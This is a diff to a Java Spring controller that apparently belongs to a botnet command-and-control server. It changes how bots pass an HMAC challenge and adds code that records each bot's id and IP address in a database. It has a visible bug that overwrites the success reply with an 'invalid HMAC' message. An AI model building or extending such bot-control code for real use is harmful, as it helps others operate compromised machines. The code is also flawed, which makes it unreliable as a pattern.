@@ -20,8 +20,11 @@ import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.servlet.ModelAndView;
 
 import cs.sii.bot.active.CryptoAuth;
+import cs.sii.bot.passive.Bot;
 import cs.sii.config.bot.Engine;
 import cs.sii.connection.NetworkService;
+import cs.sii.dao.Botter;
+import cs.sii.dao.BotterRepository;
 import cs.sii.model.IP;
 import cs.sii.model.Pairs;
 
@@ -33,6 +36,9 @@ public class CommandController {
 	
 	@Autowired
 	private CryptoAuth auth;
+	
+	@Autowired
+	private BotterRepository botRepository;
 	
 	@Autowired
 	private NetworkService networkService;
@@ -66,15 +72,15 @@ public class CommandController {
 
     //CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////
     
-    @RequestMapping(value = "/welcome", method = RequestMethod.GET)
+    @RequestMapping(value = "/welcome", method = RequestMethod.POST)
    	@ResponseBody
-   	public Pairs<Long,Integer> botFirstAcces(HttpServletResponse error,HttpServletRequest request) throws IOException {  
+   	public Pairs<Long,Integer> botFirstAcces(@RequestBody String idBot,HttpServletResponse error) throws IOException {  
     		System.out.println("1");
     		Pairs<Long,Integer> response=new Pairs<>();
     		if(engineBot.isCommandandconquerStatus()){
     			Long keyNumber=new Long(auth.generateNumberText());    	
     	    	Integer iterationNumber=new Integer(auth.generateIterationNumber());   
-    	    	auth.addBotChallengeInfo(request.getRemoteAddr(),keyNumber, iterationNumber);   	    	
+    	    	auth.addBotChallengeInfo(idBot,keyNumber, iterationNumber);   	    	
     	    	response=new Pairs<Long, Integer>(keyNumber,iterationNumber);
     		}else{
     			error.sendError(HttpStatus.SC_NOT_FOUND);
@@ -86,20 +92,23 @@ public class CommandController {
     
     @RequestMapping(value = "/hmac", method = RequestMethod.POST)
    	@ResponseBody
-   	public String botFirstAccesSecondPhase(@RequestBody String hashMac, HttpServletResponse error,HttpServletRequest request) throws IOException {  
+   	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,HttpServletRequest request) throws IOException {  
     	String response="";
-		System.out.println("hashMac="+hashMac);
 
     	if(engineBot.isCommandandconquerStatus()){
-    			if(auth.findBotChallengeInfo(request.getRemoteAddr())){
-    				System.out.println("Conosco il bot");
+    			if(auth.findBotChallengeInfo(objects.get(1).toString())){
    				
-    				IP ip=new IP(request.getRemoteAddr());
-    				Long keyNumber=auth.getBotSeed().get(ip).getValue1();
-    				Integer iterationNumber=auth.getBotSeed().get(ip).getValue2();
+    				String idBot=objects.get(1).toString();
+    				Long keyNumber=auth.getBotSeed().get(idBot).getValue1();
+    				Integer iterationNumber=auth.getBotSeed().get(idBot).getValue2();
     				
-    			if(auth.validateHmac(keyNumber, iterationNumber, hashMac))
+    			if(auth.validateHmac(keyNumber, iterationNumber, objects.get(0).toString())){
     				response="Challenge OK";
+    				Botter bot=new Botter(idBot,request.getRemoteAddr().toString(),objects.get(3).toString(),objects.get(2).toString());
+    				botRepository.save(bot);
+    			}
+    				
+    				response="Challenge con HMAC non valido";
     			}
     	}else{
     		response= "Challenge Error";
@@ -116,6 +125,14 @@ public class CommandController {
 
     	
     	return mav;
+   	}
+    
+    @RequestMapping(value = "/prova", method = RequestMethod.GET)
+    @ResponseBody
+   	public String prova() {
+
+    	
+    	return engineBot.getIdBot();
    	}
     
 }
